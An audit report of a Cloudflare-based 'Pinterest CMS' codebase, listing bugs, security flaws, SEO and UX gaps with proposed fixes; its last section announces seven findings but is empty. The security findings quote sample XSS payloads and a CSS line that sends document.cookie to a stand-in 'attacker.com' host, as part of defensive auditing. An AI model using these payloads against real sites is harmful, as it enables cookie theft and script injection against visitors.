# Pinterest CMS — Codebase Audit

**Date:** 2026-05-18  
**Scope:** All files under `src/`  
**Method:** Static analysis — no code was changed.

---

## Table of Contents

1. [Bugs](#1-bugs)
2. [Security Issues](#2-security-issues)
3. [SEO Completeness](#3-seo-completeness)
4. [CTR & Conversion Optimization](#4-ctr--conversion-optimization)
5. [Automation / API Gaps](#5-automation--api-gaps)
6. [Admin UX](#6-admin-ux)
7. [Code Quality Issues](#7-code-quality-issues)
8. [One-Line Changes](#8-one-line-changes)

---

## 1. Bugs

**12 findings.**

### B-01 · Category canonical URL ignores `category_base` setting
- **File:** `src/routes/frontend/category.ts:49`
- **Severity:** High
- **Description:** The canonical `<link>` tag is built by hand as `` `https://${hostname}/${category.slug}/` `` instead of calling `buildCategoryPath(category.slug, settings)`. If the admin has set a custom `category_base` (e.g. `topics/`), the canonical URL shown to Google is wrong, splitting link equity between the real URL and the wrong one.
- **Proposed fix:** Replace the hardcoded string with `buildCategoryPath(category.slug, settings)` the same way post pages do it. The function already exists in `src/lib/seo.ts`; only the import and one-line call need adding.

---

### B-02 · `buildPostPath` uses UTC, so posts slip into the wrong date at midnight
- **File:** `src/lib/seo.ts:buildPostPath`
- **Severity:** Medium
- **Description:** The year/month segments in permalink patterns like `/:year/:month/:slug/` are extracted from `published_at` using `new Date(d).getFullYear()` / `.getMonth()`, which operates in UTC. For a site in a UTC−5 timezone, a post published at 11 PM local time is stored as next-day UTC, so the URL contains tomorrow's date. Old posts keep their original URL, so no existing links break; but new posts published near midnight get the wrong date.
- **Proposed fix:** Accept an optional timezone offset in `buildPostPath` and apply it before extracting year/month, or document that `published_at` must always be stored in UTC and accept the known limitation. The site settings already store a `timezone` value that could be passed in.

---

### B-03 · `api_logs` foreign key silently destroys audit history on key deletion
- **File:** `src/schemas/site.sql` (api_logs table definition)
- **Severity:** High
- **Description:** The `api_key_id` foreign key is declared `ON DELETE CASCADE`. When an API key is revoked and deleted, every log row that used that key is also deleted. Audit logs exist specifically to answer "who called what and when" — including for keys that are later revoked. Silently losing that history is a compliance and security issue.
- **Proposed fix:** Change the foreign key action to `ON DELETE SET NULL`. The key name is already denormalized into the join at query time; setting the FK to NULL preserves the log row while correctly showing the key no longer exists.

---

### B-04 · Posts are hard-deleted; no trash/recovery
- **File:** `src/schemas/site.sql` (posts table), `src/routes/admin/posts.ts`
- **Severity:** Medium
- **Description:** The `DELETE FROM posts WHERE id = ?` query is executed immediately on admin delete with no soft-delete or confirmation step beyond a JavaScript `confirm()`. There is no `trashed` column or recovery path. Accidental deletion of a post with many backlinks is unrecoverable.
- **Proposed fix:** Add a `trashed INTEGER NOT NULL DEFAULT 0` column to `posts`. Change the delete action to set `trashed = 1` and filter `WHERE trashed = 0` everywhere. A separate "Trash" admin page can show trashed posts with a "Restore" or "Delete permanently" option.

---

### B-05 · `trackRedirectHit` is silently async but declared as `void`
- **File:** `src/lib/redirects.ts`
- **Severity:** Low
- **Description:** `trackRedirectHit` is called with `trackRedirectHit(siteDb, id)` (no `await`) and its return type is `void`. Internally it calls `siteDb.execute(...)` — a promise — but that promise is never awaited or handled. If the DB write fails (e.g. temporary network error) there is no log and the caller has no way to know. In a Cloudflare Worker, unawaited promises may be killed before they finish if the response is returned first.
- **Proposed fix:** Make the function return `Promise<void>` and `await` the call site, or wrap the internal execute in a `.catch()` that logs the error. At minimum, add `c.executionCtx.waitUntil(trackRedirectHit(...))` so Cloudflare keeps the Worker alive until the write finishes.

---

### B-06 · Sitemap uses `image:caption` as alt text; `image:title` tag missing
- **File:** `src/routes/frontend/sitemap.ts`
- **Severity:** Low
- **Description:** The Google Image sitemap extension uses `<image:title>` for the image title and `<image:caption>` for a longer caption. The current code emits `<image:caption>` with the alt text value. Google's sitemap parser ignores `<image:caption>` for ranking and indexing purposes; the correct tag for discovery is `<image:title>`.
- **Proposed fix:** Rename the emitted tag from `<image:caption>` to `<image:title>`. The `alt` attribute from the `post_images` table is the right value to put there.

---

### B-07 · `ensureUniqueSlug` duplicated verbatim in two files
- **File:** `src/routes/admin/posts.ts` and `src/routes/public/v1/posts.ts`
- **Severity:** Medium
- **Description:** The identical `ensureUniqueSlug` function appears in both files. If a bug is found or the logic changes (e.g. slug collision suffix format), only one copy tends to get updated, leading to inconsistent behaviour between admin-created and API-created posts.
- **Proposed fix:** Extract the function into `src/lib/slugs.ts` and import it from both call sites. No logic change — just consolidation.

---

### B-08 · `replaceImages` inside posts uses sequential awaits in a loop
- **File:** `src/routes/admin/posts.ts:replaceImages`
- **Severity:** Low
- **Description:** When saving a post, `replaceImages` iterates over each image URL and uploads it to R2 one at a time using `await` inside a `for` loop. For a post with 10 images this means 10 sequential R2 writes. Workers have a 30-second CPU time limit; large posts with many images are at risk of timing out.
- **Proposed fix:** Collect all upload promises and run them with `Promise.all(...)`. The uploads are independent and can safely run in parallel, reducing total time proportionally to the number of images.

---

### B-09 · Admin default settings provisioned sequentially, not in a batch
- **File:** `src/lib/defaults.ts:insertDefaultSettings`
- **Severity:** Low
- **Description:** When a new site is provisioned, all default settings are inserted via a `for...of` loop with sequential `await siteDb.execute(...)` calls — typically 20–30 round trips. In a Cloudflare Worker, each Turso network round-trip adds latency, making first-run setup noticeably slow.
- **Proposed fix:** Build one `INSERT OR IGNORE INTO settings (key, value) VALUES (?,?),(?,?),...` statement with all values at once, or use Turso's `batch()` API to send them as a single request.

---

### B-10 · `fetchRelatedPosts` returns nothing for uncategorised posts
- **File:** `src/views/frontend/helpers.ts:116`
- **Severity:** Low
- **Description:** The function immediately returns `[]` if `post.category_id` is falsy. Posts without a category therefore always show an empty "Related posts" section even if there are other uncategorised posts that would be good candidates.
- **Proposed fix:** If `category_id` is null, fall back to fetching recent posts of the same type ordered by `published_at DESC`, limited to the same count. This fills the "Related" section with something useful instead of nothing.

---

### B-11 · `insertDefaultSettings` loop: sequential `await` inside `for…of`
- **File:** `src/lib/defaults.ts:insertDefaultSettings`
- **Severity:** Low
- **Description:** (See B-09 — same root issue but called out separately for the provisioning path vs. any runtime call.) Under load, provisioning many sites simultaneously could exhaust the Worker's CPU budget faster than expected.
- **Proposed fix:** Same as B-09: batch the INSERT statements.

---

### B-12 · Menu `/reorder` accepts IDs without confirming they belong to this site
- **File:** `src/routes/admin/menus.ts:/reorder`
- **Severity:** Medium
- **Description:** The reorder endpoint reads an array of `{id, ord}` objects from the POST body and issues `UPDATE menu_items SET ord = ? WHERE id = ?` for each. It does not verify that the `id` values belong to the authenticated site's database. Because each site has its own Turso DB this is currently unexploitable across sites, but if the multi-tenant model ever changes, or if a bug in `tenantMiddleware` attaches the wrong DB, an attacker could reorder another site's menu items.
- **Proposed fix:** Add `AND site_id = ?` to the UPDATE statement (or rely on the fact that each site DB only contains its own rows — in which case document that assumption explicitly so it is not silently broken later).

---

## 2. Security Issues

**8 findings.**

### S-01 · CORS reflects any origin with `Allow-Credentials: true`
- **File:** `src/middleware/corsMiddleware.ts`
- **Severity:** Critical
- **Description:** The middleware takes the request's `Origin` header and echoes it back as `Access-Control-Allow-Origin` while also sending `Access-Control-Allow-Credentials: true`. This is the textbook CORS misconfiguration: any website in the world can make an authenticated cross-origin request to the public API using the visitor's browser cookies or credentials. An attacker site could silently read private data from the API on behalf of a logged-in user.
- **Proposed fix:** Replace the reflected origin with an explicit allowlist stored in Wrangler environment variables (e.g. `CORS_ALLOWED_ORIGINS`). For fully public endpoints that don't need credentials, use `Access-Control-Allow-Origin: *` and drop the `Allow-Credentials` header. Never combine a wildcard/reflected origin with `Allow-Credentials: true`.

---

### S-02 · Admin POST routes have no CSRF protection
- **File:** `src/middleware/authMiddleware.ts`, `src/lib/auth.ts:csrfMatch`
- **Severity:** High
- **Description:** `csrfMatch` is defined in `src/lib/auth.ts` and was clearly intended to protect admin forms, but it is never called anywhere. Every admin POST route (create/edit/delete post, change settings, delete API keys, etc.) relies solely on the HttpOnly JWT cookie. A malicious site can submit a form to `https://yoursite.com/admin/posts/delete/123` and the browser will attach the cookie automatically, completing the action without the user's knowledge.
- **Proposed fix:** Call `csrfMatch(c.req.cookie("csrf"), c.req.header("X-CSRF-Token"))` inside `adminAuthMiddleware` for all non-GET requests and return 403 on mismatch. The admin forms need a hidden `<input name="csrf">` field populated with the token, and the token needs to be included in the JWT or stored in the session cookie.

---

### S-03 · Stored XSS via unescaped `post.content` on the frontend
- **File:** `src/routes/frontend/post.ts:~195`
- **Severity:** Critical
- **Description:** Post body HTML is rendered directly into the page as `` `<div class="post-content">${post.content}</div>` `` with no escaping. If an admin (or an API client with a valid key) stores a post containing `<script>alert(1)</script>`, that script executes in every visitor's browser. The risk is amplified because API keys can create posts, so a compromised key is a direct XSS vector.
- **Proposed fix:** Run `post.content` through an HTML sanitiser (allow-list of safe tags: `p`, `b`, `i`, `a`, `img`, `ul`, `ol`, `li`, `h2`–`h6`, `blockquote`, `code`, `pre`) before rendering. The Cloudflare HTMLRewriter API can strip disallowed tags server-side without a large dependency.

---

### S-04 · Raw API key exposed in redirect URL
- **File:** `src/routes/admin/apiKeys.ts`
- **Severity:** High
- **Description:** After creating an API key, the plaintext key is passed in the redirect URL as a query parameter: `/admin/api-keys?revealed=<KEY>&name=...`. The key therefore appears in browser history, server access logs, Cloudflare edge logs, and any browser extensions that monitor URLs. Once a key is logged it cannot be "un-logged".
- **Proposed fix:** Store the newly created key in an HttpOnly session flash cookie that is read and deleted on the next GET. The key is then shown to the admin exactly once in the response body without appearing in any URL or log.

---

### S-05 · Network `admin_key` passed as a query parameter in form actions
- **File:** `src/routes/network/sites.ts`
- **Severity:** High
- **Description:** Forms in the network admin UI build their `action` attribute as `"/api/network/sites?admin_key=${encodeURIComponent(adminKey)}"`. The network admin key ends up in browser history, Referer headers on outbound links, and Cloudflare access logs every time a form is submitted.
- **Proposed fix:** Move the key to a hidden `<input>` field in the form body, which keeps it out of URLs, or read it from a header (e.g. `X-Admin-Key`) that is set once on page load and sent with every fetch.

---

### S-06 · Admin custom CSS insufficiently sanitised — allows `url()` data exfiltration
- **File:** `src/lib/theme.ts:renderThemeStyleTag`
- **Severity:** High
- **Description:** The custom CSS sanitiser only strips `</style` sequences to prevent tag injection. It does not block `url()`, `@import`, or `expression()`. A malicious admin (or an attacker who gains admin access) can insert `background: url("https://attacker.com/steal?c=" + document.cookie)` (in older IE) or use `@import url(...)` to load an external stylesheet. In modern browsers `url()` in CSS can still be used to exfiltrate the page URL to a third party via image load.
- **Proposed fix:** Either parse the CSS through a strict allowlist (properties, values) or add a `Content-Security-Policy` header that blocks `unsafe-inline` styles and restricts `style-src` to `'self'`. At minimum, strip `url(` and `@import` from admin-submitted CSS.

---

### S-07 · Admin message/redirect body rendered as raw HTML
- **File:** `src/lib/redirects.ts` (message field used in admin views)
- **Severity:** Medium
- **Description:** The `message` column from the `redirects` table is rendered into the admin HTML without escaping in at least one admin view. An admin who stores a redirect with a message containing `<img src=x onerror=alert(1)>` would trigger XSS in their own admin panel. While self-XSS has limited impact, it is bad practice and could be elevated by social engineering.
- **Proposed fix:** Pass all admin-displayed user-controlled strings through `escapeHtml()` before rendering. This is already done correctly in other admin views.

---

### S-08 · No rate limiting on the public API or the login route
- **File:** `src/routes/admin/login.ts`, `src/routes/public/v1/`
- **Severity:** Medium
- **Description:** The admin login POST and all public API endpoints lack any rate limiting. The login form is vulnerable to credential-stuffing and brute-force attacks. The public API can be abused to scrape all posts in bulk or generate high database load. Cloudflare Workers do not enforce request limits at the application layer unless explicitly configured.
- **Proposed fix:** Add a Cloudflare Rate Limiting rule in the dashboard for `/admin/login` (e.g. 5 requests per minute per IP). For the public API, check the `CF-Connecting-IP` header and use a Cloudflare KV store or Durable Object as a sliding-window counter, returning 429 when exceeded.

---

## 3. SEO Completeness

**14 findings.**

### SEO-01 · `<meta name="robots">` missing from category and tag pages
- **File:** `src/routes/frontend/category.ts`, `src/views/frontend/Layout.ts`
- **Severity:** High
- **Description:** The `<head>` for category pages does not include a `<meta name="robots" content="index, follow">` tag. While absence does not mean noindex, explicit control is best practice and some crawlers behave differently without it. More importantly, the `no_index` post setting has no equivalent for categories, so there is no way to noindex a thin category.
- **Proposed fix:** Add a `robots` parameter to the layout that defaults to `"index, follow"` but can be overridden. Pass `"noindex, follow"` for categories that have fewer than N posts (configurable).

---

### SEO-02 · No `<link rel="canonical">` on paginated category pages
- **File:** `src/routes/frontend/category.ts`
- **Severity:** High
- **Description:** When a category has multiple pages (page 2, 3…) there is no canonical or `rel="prev"` / `rel="next"` pagination hint. Google can index every paginated URL as a separate entity, diluting ranking signals.
- **Proposed fix:** Emit `<link rel="canonical" href="...">` pointing to the paginated URL itself (self-canonical for each page) and optionally add `rel="prev"` / `rel="next"` links in the `<head>`, which Bing still uses even though Google dropped support.

---

### SEO-03 · `<title>` tag on category page does not include page number
- **File:** `src/routes/frontend/category.ts`
- **Severity:** Medium
- **Description:** All paginated category pages share the same `<title>Category Name — Site Name</title>` even on page 2+. Duplicate titles across multiple URLs are a crawl quality signal Google uses to de-prioritise pages.
- **Proposed fix:** Append ` — Page 2` (etc.) to the title for pages > 1. Same for the `og:title` meta tag.

---

### SEO-04 · Open Graph image missing on category and home pages
- **File:** `src/routes/frontend/home.ts`, `src/routes/frontend/category.ts`
- **Severity:** Medium
- **Description:** Neither the home page nor category pages emit an `og:image` meta tag. When shared on social media these pages show a blank or site-icon-only preview, reducing click-through from social shares.
- **Proposed fix:** Use the first post's cover image from the page as the default `og:image`. Add a fallback `og:image` setting in the admin (Appearance → Social preview image) that is used when no post image is available.

---

### SEO-05 · `og:type` is hardcoded as `"website"` on post pages
- **File:** `src/views/frontend/Layout.ts`
- **Severity:** Low
- **Description:** Individual post pages should emit `og:type = "article"` along with `article:published_time` and `article:author`. Using `"website"` for posts means Facebook/LinkedIn treat them as generic pages rather than articles, which affects how they are indexed and displayed in news feeds.
- **Proposed fix:** Pass an `ogType` parameter to the layout (`"article"` for posts, `"website"` for lists). For article type, also emit `<meta property="article:published_time">` with the post's `published_at` value.

---

### SEO-06 · `<meta name="description">` falls back to raw HTML excerpt
- **File:** `src/views/frontend/Layout.ts`, `src/lib/utils.ts:plainExcerpt`
- **Severity:** Medium
- **Description:** When a post has no custom excerpt, `plainExcerpt` is called to strip HTML from the content. However, `plainExcerpt` uses a simple regex that may leave behind HTML entity references (`&amp;`, `&nbsp;`, etc.) in the description tag, which appear verbatim in search result snippets.
- **Proposed fix:** After stripping tags, run the string through an HTML entity decoder (replace `&amp;` → `&`, `&lt;` → `<`, etc.) before using it as a meta description. Limit the description to 155 characters to avoid truncation in SERPs.

---

### SEO-07 · Sitemap does not include category pages
- **File:** `src/routes/frontend/sitemap.ts`
- **Severity:** High
- **Description:** The XML sitemap lists posts and pages but not category archive URLs. Category pages accumulate internal links over time and often rank well for broad keywords. Omitting them means Googlebot discovers them only through crawling, which can delay indexing.
- **Proposed fix:** Add a `SELECT slug FROM categories` query to `sitemap.ts` and emit one `<url>` entry per category using `buildCategoryPath(slug, settings)`. Set `<changefreq>weekly</changefreq>` and `<priority>0.6</priority>`.

---

### SEO-08 · No `hreflang` support
- **File:** `src/views/frontend/Layout.ts`
- **Severity:** Low
- **Description:** There is no mechanism for declaring language/region alternates (`<link rel="alternate" hreflang="en-US" href="...">`). For sites that serve the same content in multiple languages across different hostnames, Google cannot consolidate ranking signals.
- **Proposed fix:** Add optional `hreflang` links as an array in the layout parameters. In practice, this is a low-priority addition unless the CMS is used for multilingual sites.

---

### SEO-09 · `robots.txt` does not reference sitemap URL
- **File:** `src/routes/frontend/robots.ts` (or wherever robots.txt is generated)
- **Severity:** Medium
- **Description:** The `robots.txt` response does not include a `Sitemap:` directive pointing to `/sitemap.xml`. The Sitemap directive in robots.txt is the fastest way for any search engine (not just Google, which checks Search Console) to discover the sitemap.
- **Proposed fix:** Append `Sitemap: https://${hostname}/sitemap.xml` to the generated `robots.txt` content.

---

### SEO-10 · Post `<title>` tag format not configurable
- **File:** `src/views/frontend/Layout.ts`
- **Severity:** Low
- **Description:** The post page title is always `Post Title — Site Name`. There is no setting for separator character or format (e.g. `Site Name | Post Title`, `Post Title (Site Name)`). Different title formats can affect CTR in search results.
- **Proposed fix:** Add a `seo_title_format` setting (e.g. `{title} — {site}` vs `{site} | {title}`) in the SEO admin and apply it when building the `<title>` tag.

---

### SEO-11 · No `<meta name="author">` on post pages
- **File:** `src/views/frontend/Layout.ts`
- **Severity:** Low
- **Description:** Post pages do not emit `<meta name="author">`. While not a direct ranking factor, it contributes to E-E-A-T signals (Experience, Expertise, Authoritativeness, Trustworthiness) that Google's quality guidelines prioritise for content sites.
- **Proposed fix:** Add an `author` field to the settings (or per-post) and emit `<meta name="author" content="...">` on post pages.

---

### SEO-12 · `<link rel="alternate" type="application/rss+xml">` missing from pages
- **File:** `src/views/frontend/Layout.ts`
- **Severity:** Low
- **Description:** The RSS feed exists at `/feed.xml` but the `<head>` does not include a `<link rel="alternate">` tag pointing to it. RSS autodiscovery by browsers and feed readers depends on this tag.
- **Proposed fix:** Add `<link rel="alternate" type="application/rss+xml" title="${siteName}" href="/feed.xml">` to the layout `<head>`.

---

### SEO-13 · Structured data (JSON-LD) absent from post pages
- **File:** `src/routes/frontend/post.ts`
- **Severity:** High
- **Description:** There is no JSON-LD `Article` or `BlogPosting` schema on post pages. Rich results (headline, date, breadcrumb in SERPs) require structured data. This is one of the highest-impact SEO improvements for a content-heavy CMS.
- **Proposed fix:** Inject a `<script type="application/ld+json">` block containing an `Article` schema object (headline, image, datePublished, dateModified, author, publisher) into the post page `<head>`. Use the existing post fields; no new data is needed.

---

### SEO-14 · No breadcrumb structured data on category or post pages
- **File:** `src/routes/frontend/post.ts`, `src/routes/frontend/category.ts`
- **Severity:** Medium
- **Description:** Google shows breadcrumb rich results for pages that include `BreadcrumbList` JSON-LD. Neither post nor category pages include this schema, missing an opportunity for enhanced SERP display and clearer site structure signals.
- **Proposed fix:** Add a `BreadcrumbList` JSON-LD object to both page types: `Home > Category > Post Title` for posts, `Home > Category Name` for categories. Reuse data already fetched by the route handlers.

---

## 4. CTR & Conversion Optimization

**9 findings.**

### CTR-01 · No "Read more" / CTA button on grid cards
- **File:** `src/views/frontend/PinterestGrid.ts:renderPinCard`
- **Severity:** Medium
- **Description:** Pin cards link the entire card to the post, but there is no visible call-to-action button. User eye-tracking studies show that a visible button ("Read more", "View post") increases click-through compared to an invisible whole-card link, especially on desktop where the pointer cursor is the only affordance.
- **Proposed fix:** Add a small `<span class="pin-read-more">Read more →</span>` element inside `.pin-content`. Control it with a `theme_show_read_more` setting so it can be toggled off.

---

### CTR-02 · No "image count" badge variant for single-image posts
- **File:** `src/views/frontend/PinterestGrid.ts:renderPinCard:57`
- **Severity:** Low
- **Description:** The image count badge (`3 photos`) only appears when `image_count > 1`. There is no badge for posts with zero cover images, which leaves no visual cue that the post may be text-only. Users on image-heavy sites tend to skip non-image posts without realising they contain valuable content.
- **Proposed fix:** Add an optional text-only badge (`📄 Article`) for posts where `cover_image` is null and `image_count === 0`. Toggle it with a setting so image-focused sites can hide it.

---

### CTR-03 · Excerpt text truncated mid-word
- **File:** `src/lib/utils.ts:plainExcerpt`
- **Severity:** Low
- **Description:** `plainExcerpt` truncates at a fixed character count without checking for word boundaries. Search snippets cut at 120 characters frequently end mid-word (e.g. "The best shilajit supplem…"), which looks unprofessional in grid cards.
- **Proposed fix:** After truncating at 120 characters, walk backwards to the last space and truncate there. Append `…` only if text was actually truncated.

---

### CTR-04 · No featured / hero post slot on the home page
- **File:** `src/routes/frontend/home.ts`
- **Severity:** Medium
- **Description:** All posts are rendered in the same uniform grid. There is no way to pin or "feature" a post so it appears larger or above the fold, which is a standard pattern on Pinterest-style sites to draw attention to high-value content.
- **Proposed fix:** Add a `featured` column to `posts` (boolean, default 0). Query for one featured post separately and render it with a full-width hero card above the grid. Add a toggle to the post editor.

---

### CTR-05 · Related posts section limited to same category
- **File:** `src/views/frontend/helpers.ts:fetchRelatedPosts`
- **Severity:** Medium
- **Description:** Related posts are only shown when a post has a category, and only posts in the exact same category are shown. This is often too narrow: a post may have only 1–2 other posts in its category, leaving 4–5 empty slots that could be filled with tag-based or content-similarity matches.
- **Proposed fix:** Implement a two-pass approach: first fetch same-category posts up to the limit; then if fewer than `limit` are found, pad with recent posts across all categories excluding the current post.

---

### CTR-06 · No internal linking widget (e.g. "You might also like")
- **File:** `src/routes/frontend/post.ts`
- **Severity:** Low
- **Description:** After the post body there is only the Related Posts grid. There is no inline widget for embedding "you might also like" links into the post stream, which is a high-CTR engagement pattern on content sites.
- **Proposed fix:** This is a content-editorial feature; a low-effort version would be a `[related id="..."]` shortcode in post content that is replaced server-side with a linked card. Medium effort: a sidebar widget rendered alongside the post.

---

### CTR-07 · Social share buttons absent from post pages
- **File:** `src/routes/frontend/post.ts`
- **Severity:** Medium
- **Description:** Post pages have no Pinterest Save button, Facebook Share, or copy-link widget. For a Pinterest-themed CMS, the absence of a Pinterest Save button is a notable gap: it is the primary viral growth mechanism for this content category (inspirational/visual content).
- **Proposed fix:** Add a Pinterest Save button using the Pinterest widget script with the post's cover image as the `data-media` attribute. Make it toggleable via a `theme_show_pinterest_save` setting. Avoid sharing scripts for privacy-sensitive visitors by making the button server-rendered (a plain link to `https://pinterest.com/pin/create/button/?url=...`).

---

### CTR-08 · `og:image` not sized or previewable
- **File:** `src/views/frontend/Layout.ts`
- **Severity:** Low
- **Description:** Even where `og:image` is set (on posts), the tag does not include `og:image:width`, `og:image:height`, or `og:image:type`. Facebook and LinkedIn use these to pre-validate images; without them, images may not display in share previews or may be delayed while the platform fetches and sizes the image.
- **Proposed fix:** When the cover image URL is a Cloudflare R2 URL, append `og:image:width` (e.g. 1200) and `og:image:height` (e.g. 630) meta tags with the known upload dimensions. Store width/height in the `media` table at upload time.

---

### CTR-09 · No newsletter / lead capture integration
- **File:** (entire `src/` — absent feature)
- **Severity:** Low
- **Description:** There is no mechanism for capturing email addresses (newsletter signup form, exit-intent popup, or inline CTA). For content sites dependent on return visits, email capture is the highest-ROI conversion element.
- **Proposed fix:** Add a settings field for a Mailchimp/ConvertKit/Beehiiv embed snippet. Render it in the post page sidebar or below the post body. This is a low-code integration (just outputting a safe embed snippet) rather than building a full email system.

---

## 5. Automation / API Gaps

**8 findings.**

### API-01 · No webhook support for post publish/update events
- **File:** `src/routes/admin/posts.ts`, `src/routes/public/v1/posts.ts`
- **Severity:** Medium
- **Description:** When a post is published or updated (via admin or API), there is no outbound webhook fired to notify external systems (Zapier, Make, custom automations). Customers using the API to ingest content have no push notification; they must poll.
- **Proposed fix:** Add a `webhooks` table with `url`, `secret`, and `events` (JSON array) columns. On each post create/update/delete, fire an async `waitUntil(sendWebhook(...))` with an HMAC-SHA-256 signed payload. Add a Webhooks admin page for managing endpoints.

---

### API-02 · Public API has no pagination metadata in response
- **File:** `src/routes/public/v1/posts.ts`
- **Severity:** Medium
- **Description:** The list-posts endpoint returns a JSON array but no envelope with `total`, `page`, `per_page`, or `next_cursor` fields. API clients cannot determine how many pages exist without making an extra `COUNT(*)` call, and there is no cursor-based pagination for large datasets.
- **Proposed fix:** Wrap the response in `{ data: [...], meta: { total, page, per_page, has_next } }`. Run a `SELECT COUNT(*)` in parallel with the data query (already done for frontend; just not exposed in the API response).

---

### API-03 · No bulk post creation endpoint
- **File:** `src/routes/public/v1/posts.ts`
- **Severity:** Medium
- **Description:** The API only supports creating one post per request. Clients that need to import large datasets (100+ posts) must make sequential requests, which is slow and uses more API rate limit quota than a bulk endpoint would.
- **Proposed fix:** Add `POST /api/public/v1/posts/bulk` accepting an array of post objects (up to e.g. 50 per call). Use Turso's `batch()` API to execute all inserts in a single round-trip, returning an array of `{id, slug, status}` results.

---

### API-04 · API does not expose media upload
- **File:** `src/routes/public/v1/` (absent)
- **Severity:** Medium
- **Description:** External API clients (Zapier, Make, custom scrapers) cannot upload images via the API. They can reference external image URLs in posts, but those URLs will not be stored in R2 or managed through the media library. Over time, posts created via API will have external image dependencies that may break.
- **Proposed fix:** Add `POST /api/public/v1/media` accepting a multipart form or base64 body, storing the file in R2 under the site's namespace, and returning the R2 public URL. Reuse the existing R2 upload logic from the admin media route.

---

### API-05 · No API endpoint for categories
- **File:** `src/routes/public/v1/` (absent)
- **Severity:** Low
- **Description:** External clients that create posts via API cannot look up or create categories via the API. They must either hardcode category IDs or use the admin UI. This breaks fully automated content pipelines.
- **Proposed fix:** Add `GET /api/public/v1/categories` (list) and `POST /api/public/v1/categories` (create) endpoints. These are simple CRUD routes mirroring the admin category routes.

---

### API-06 · API key has no per-endpoint permission scoping
- **File:** `src/routes/admin/apiKeys.ts`, `src/middleware/authMiddleware.ts`
- **Severity:** Medium
- **Description:** API keys are all-or-nothing: a key that can create posts can also delete posts, list all media, and read all categories. There is no scope field (e.g. `posts:write`, `posts:read`, `media:read`) to issue least-privilege keys to third-party integrations.
- **Proposed fix:** Add a `scopes` column (JSON array) to `api_keys`. Validate the required scope in each public API route handler. The admin UI for key creation should show checkboxes for each available scope.

---

### API-07 · No `Last-Modified` or `ETag` headers on API responses
- **File:** `src/routes/public/v1/posts.ts`
- **Severity:** Low
- **Description:** The public API returns posts with no cache validation headers. Clients that poll the API frequently cannot use conditional GET (`If-None-Match`, `If-Modified-Since`) to avoid re-downloading unchanged data.
- **Proposed fix:** For single-post GET responses, set `ETag` to a hash of `updated_at` + `id`. For list responses, set `Last-Modified` to the most recent `updated_at` value in the result set. Return 304 Not Modified when the client's validator matches.

---

### API-08 · `api_logs` table has no retention policy
- **File:** `src/schemas/site.sql`
- **Severity:** Low
- **Description:** Every API request is logged to `api_logs` with no expiry or pruning. A high-traffic site will accumulate millions of log rows over time, inflating the Turso DB size and slowing queries that JOIN against `api_logs`.
- **Proposed fix:** Add a scheduled task (Cloudflare Cron Trigger) that runs `DELETE FROM api_logs WHERE created_at < datetime('now', '-90 days')` daily. Expose a `log_retention_days` setting in admin.

---

## 6. Admin UX

**8 findings.**

### UX-01 · No visual feedback after saving settings / appearance
- **File:** `src/routes/admin/settings.ts`, `src/routes/admin/appearance.ts`
- **Severity:** Medium
- **Description:** After submitting the settings or appearance forms, the page redirects back to itself with no visible success message. If the redirect happens quickly the user cannot tell whether their save succeeded or was silently ignored.
- **Proposed fix:** Pass a `?saved=1` query parameter on the redirect and render a dismissible `<div class="banner success">Settings saved.</div>` at the top of the page when that parameter is present.

---

### UX-02 · Post editor has no autosave or draft recovery
- **File:** `src/routes/admin/posts.ts`
- **Severity:** High
- **Description:** The post editor is a plain HTML form. If the browser tab crashes, the user navigates away by accident, or the network times out on save, all unsaved work is lost. There is no autosave interval, no local-storage draft backup, and no "unsaved changes" warning on page leave.
- **Proposed fix:** Add a small `beforeunload` event listener (a few lines of JavaScript) that warns the user if the form is dirty. For full autosave, periodically POST the form to a `/admin/posts/:id/autosave` endpoint that updates only `content` and `title` without changing `published` status.

---

### UX-03 · Media library has no search or filter
- **File:** `src/routes/admin/media.ts`
- **Severity:** Medium
- **Description:** The media library lists all uploads in reverse-chronological order. As the library grows there is no way to search by filename, filter by type (image/video), or sort differently. Finding a specific image requires scrolling through all uploads.
- **Proposed fix:** Add a `?q=` query parameter that filters `WHERE filename LIKE ?` and a `?type=` filter. Render a simple search box and type dropdown at the top of the media page.

---

### UX-04 · No "preview" for draft posts
- **File:** `src/routes/admin/posts.ts`, `src/routes/frontend/post.ts`
- **Severity:** Medium
- **Description:** Draft posts cannot be previewed from the admin editor. The only way to see how a post will look is to publish it (making it public) and then unpublish it. This is a significant workflow problem for sites where drafts are reviewed before publishing.
- **Proposed fix:** Add a `/admin/posts/:id/preview` route that renders the post through the frontend template with the same styles but wrapped in a `<div class="preview-banner">This is a preview…</div>` header. The route is protected by admin auth, so drafts stay private.

---

### UX-05 · Bulk post actions absent (select all, delete, publish)
- **File:** `src/routes/admin/posts.ts` (list view)
- **Severity:** Medium
- **Description:** The admin post list has no checkboxes or bulk action controls. Deleting or publishing/unpublishing multiple posts requires opening each post individually. For sites with hundreds of posts this is very tedious.
- **Proposed fix:** Add a checkbox column to the post list table. Add a `<select>` for action (Publish / Unpublish / Delete) and a Submit button at the top or bottom. The form POST should send a JSON array of IDs; a single new route handles bulk operations.

---

### UX-06 · No "footer branding" toggle
- **File:** `src/views/frontend/Layout.ts`
- **Severity:** Low
- **Description:** The footer always displays `Built on Cloudflare · Powered by Pinterest CMS`. There is no `footer_show_built_with` setting to disable it. White-label users who want an unbranded site cannot remove this without editing source code.
- **Proposed fix:** Add a `footer_show_built_with` setting (default `"true"`) in `src/lib/defaults.ts` and conditionally render the branding line in the layout based on that setting.

---

### UX-07 · Category selection in post editor is a plain `<select>`; no "create new" option
- **File:** `src/routes/admin/posts.ts` (post edit form)
- **Severity:** Low
- **Description:** When editing a post, the category field is a plain dropdown. If the desired category doesn't exist yet, the admin must open a second tab, navigate to Categories, create it, return to the post, and reload the form. There is no inline "Create category" shortcut.
- **Proposed fix:** Add a small `+ New category` link next to the `<select>` that opens a modal form (or redirects to `/admin/categories/new?return_to=/admin/posts/:id`). A modal requires a few lines of JavaScript; the redirect approach requires zero JS.

---

### UX-08 · Admin sidebar has no active-state highlighting for sub-routes
- **File:** `src/views/admin/Layout.ts`
- **Severity:** Low
- **Description:** The admin sidebar marks the active nav item by comparing the `active` parameter passed from the route handler. Deep routes (e.g. `/admin/posts/new`, `/admin/posts/123`) correctly mark "Posts" as active, but nested admin routes like `/admin/api-keys` only highlight if the handler explicitly passes `active: "api-keys"`. If a new admin route is added without matching the `active` string convention, the sidebar shows no item highlighted.
- **Proposed fix:** Derive the active state from the URL path prefix automatically (e.g. `pathname.startsWith("/admin/posts")` → highlight Posts) rather than relying on each handler to pass the correct `active` string.

---

## 7. Code Quality Issues

**7 findings.**

